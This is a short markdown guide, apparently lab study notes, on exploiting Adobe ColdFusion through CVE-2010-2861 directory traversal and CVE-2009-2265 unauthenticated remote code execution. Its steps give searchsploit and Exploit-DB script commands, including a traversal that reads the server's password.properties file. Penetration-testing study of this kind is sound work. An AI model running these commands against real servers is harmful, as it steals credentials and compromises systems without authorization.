# ColdFusion Exploitation Guide

## 1. Overview of ColdFusion Vulnerabilities

ColdFusion is a Java-based web application development platform known for its CFML (ColdFusion Markup Language). However, several versions have been found vulnerable to severe exploits, including:

- **CVE-2010-2861 (Directory Traversal)** – Allows attackers to read arbitrary files by manipulating the locale parameter.
    
- **CVE-2009-2265 (Unauthenticated RCE)** – Permits unauthenticated file uploads, leading to Remote Code Execution (RCE) through the FCKeditor package.

## 2. Exploitation Techniques

### 2.1 Directory Traversal Exploit (CVE-2010-2861)

**Objective:** Read arbitrary files from the ColdFusion server.

#### Steps:

1. **Search for available exploits**
    
    ```bash
    searchsploit adobe coldfusion
    searchsploit -p 14641
    ```
    
2. **Copy the exploit script to the working directory**
    
    ```bash
    cp /usr/share/exploitdb/exploits/multiple/remote/14641.py .
    ```
    
3. **Execute the script**
    
    ```bash
    python2 14641.py <target_ip> <target_port> <file_path>
    ```
    

**Example Usage:**

```bash
python2 14641.py 10.129.204.230 8500 "../../../../../../../../ColdFusion8/lib/password.properties"
```

### 2.2 Unauthenticated Remote Code Execution (CVE-2009-2265)

**Objective:** Gain remote code execution by exploiting a vulnerability in ColdFusion’s FCKeditor package.

#### Steps:

1. **Search for the exploit**
    
    ```bash
    searchsploit -p 50057
    ```
    
2. **Copy the exploit script**
    
    ```bash
    cp /usr/share/exploitdb/exploits/cfm/webapps/50057.py .
    ```
    
3. **Modify the script** – Update local and remote IP addresses and ports.
    
4. **Execute the exploit**
    
    ```bash
    python3 50057.py
    ```

## 3. Commands Summary

### 3.1 SearchSploit Usage

```bash
searchsploit adobe coldfusion
searchsploit -p 14641
searchsploit -p 50057
```

### 3.2 File Manipulation

```bash
cp /usr/share/exploitdb/exploits/multiple/remote/14641.py .
cp /usr/share/exploitdb/exploits/cfm/webapps/50057.py .
```

### 3.3 Exploit Execution

```bash
python2 14641.py <target_ip> <target_port> <file_path>
python3 50057.py
```

## 4. Key Takeaways

- **SearchSploit** is a useful tool for identifying known vulnerabilities and exploits.
    
- **Directory traversal** can allow unauthorized access to sensitive files.
    
- **Unauthenticated RCE** can lead to full system compromise.
    
- Always modify exploit scripts to fit your target’s IP and port.
    
- **Responsible and ethical hacking is critical** – never exploit systems without permission.
